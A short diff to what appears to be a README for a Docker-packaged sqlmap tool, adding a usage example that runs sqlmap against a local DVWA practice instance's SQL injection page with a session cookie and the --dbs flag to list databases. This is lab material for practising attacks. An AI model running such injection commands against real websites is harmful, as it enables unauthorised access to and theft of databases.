@@ -6,3 +6,6 @@ docker run -it -u <URL>
 see
 https://github.com/sqlmapproject/sqlmap.git
 for options and info
+
+this is using dvwa and the ip address is collected using containerips
+docker run -it sql_injection -u "http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=loif1hgpc539lith3rvbe1coh1" --dbs
